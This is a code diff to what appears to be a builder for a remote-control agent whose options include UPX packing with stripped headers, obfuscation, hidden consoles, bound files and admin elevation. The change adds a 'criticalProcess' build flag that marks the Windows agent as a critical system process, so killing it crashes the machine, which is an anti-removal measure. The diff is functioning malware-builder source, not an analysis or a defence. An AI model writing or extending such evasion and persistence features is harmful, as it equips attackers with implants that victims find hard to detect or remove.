@@ -87,6 +87,7 @@ type BuildProcessConfig = {
   enableUpx?: boolean;
   upxStripHeaders?: boolean;
   requireAdmin?: boolean;
+  criticalProcess?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
   boundFiles?: BoundFile[];
@@ -738,6 +739,12 @@ func runBoundFiles() {
         const hideConsoleFlag = "-H=windowsgui";
         ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
         sendToStream({ type: "output", text: "Windows console hidden (GUI subsystem)\n", level: "info" });
+      }
+
+      if (config.criticalProcess && os === "windows") {
+        const criticalFlag = "-X overlord-client/cmd/agent/config.DefaultCriticalProcess=true";
+        ldflags = ldflags ? `${ldflags} ${criticalFlag}` : criticalFlag;
+        sendToStream({ type: "output", text: "Critical process: enabled (requires admin at runtime)\n", level: "info" });
       }
 
       if (config.obfuscate) {
